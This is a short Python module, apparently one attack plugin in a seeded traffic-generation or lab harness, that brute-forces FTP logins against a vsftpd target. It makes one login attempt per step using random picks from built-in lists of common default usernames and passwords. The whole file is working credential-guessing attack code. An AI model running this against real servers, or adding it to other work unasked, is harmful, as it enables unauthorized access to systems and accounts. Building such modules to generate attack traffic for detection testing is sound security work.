"""FTP brute force against vsftpd: one login attempt per step, from a seeded wordlist."""
import ftplib

ATTACK_TYPE = "ftp_brute"
DEFAULT_RATE = 1.0

USERS = ["ftp", "anonymous", "admin", "root", "test", "user", "backup", "www-data", "uploader", "guest"]
PASSWORDS = ["ftp", "password", "admin", "123456", "root", "letmein", "changeme", "welcome1",
             "anonymous", "qwerty", "12345678", "abc123", "toor", "secret"]


def step(ctx):
    host, port = ctx.targets["ftp"]
    ftp = ftplib.FTP()
    try:
        ftp.connect(host, port, timeout=ctx.timeout)
        ftp.login(ctx.rng.choice(USERS), ctx.rng.choice(PASSWORDS))
    finally:
        try:
            ftp.quit()
        except Exception:
            ftp.close()
